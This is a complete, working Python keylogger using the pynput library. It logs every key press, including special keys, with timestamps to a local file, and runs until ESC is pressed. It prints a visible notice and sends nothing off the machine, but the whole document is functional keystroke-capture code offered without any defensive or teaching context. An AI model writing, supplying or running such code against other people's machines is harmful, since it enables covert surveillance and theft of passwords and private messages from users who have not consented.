import logging
from pynput import keyboard
from datetime import datetime

# Set log filename with timestamp
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

# Setup logging
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on ESC
        print("Exiting keylogger...")
        return False

print("Keylogger is running... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
